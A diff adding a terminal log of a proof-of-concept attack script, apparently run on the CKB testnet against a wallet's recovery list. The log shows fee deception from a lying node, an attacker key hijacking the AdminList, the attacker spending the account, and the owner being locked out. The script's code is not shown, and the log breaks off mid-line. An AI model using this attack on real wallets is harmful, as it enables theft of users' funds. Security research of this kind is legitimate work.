@@ -1,0 +1,18 @@
+$ npx tsx testnet-adminlist-hijack.ts enable
+enable: test_tx_pool_accept ACCEPTED, cycles 2631081
+enable: sent 0x7c1e9c4f5d26cdac1e4442a2f80ba61457ec07ddb86fb5c4408b2e6abc73047c, waiting
+enable: committed
+$ npx tsx testnet-adminlist-hijack.ts burn
+page shows: 100 CKB, moves 99.99999235 CKB, fee 0.00000765 CKB
+real inputs 9802.99998972 CKB, real fee 9702.99999737 CKB
+burn (rescue built from a lying node, signed by E1): test_tx_pool_accept ACCEPTED, cycles 1536042
+$ npx tsx testnet-adminlist-hijack.ts hijack
+hijack (E1 recreates the AdminList under T's lock): test_tx_pool_accept ACCEPTED, cycles 2582754
+hijack (E1 recreates the AdminList under T's lock): sent 0x72e8c34784d8fd1db89ff9534f90473bf4c562b596cfa915bae0cd1ff07a36c4, waiting
+hijack (E1 recreates the AdminList under T's lock): committed
+$ npx tsx testnet-adminlist-hijack.ts after
+AdminList now at 0x72e8c34784d8fd1db89ff9534f90473bf4c562b596cfa915bae0cd1ff07a36c4:0 lock is the account's Omnilock: false
+KeyWay removing E1 (planBackupChange): The recovery list isn't this account's
+rescue page: This address's recovery list isn't on chain. Without it no backup can move the funds
+E1 spends the account with the AdminList under T's lock: test_tx_pool_accept ACCEPTED, cycles 1560082
+K (owner) tries to take the list back: test_tx_pool_accept REJECTED: Client request error TransactionFailedToVerify: Verification failed Script(TransactionScriptError { source: Inputs[0].Lock, cause: ValidationFailure: see error code -2 on page https://nervosnetwork.github.io/ckb-script-error-codes/by-type-hash/9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723b
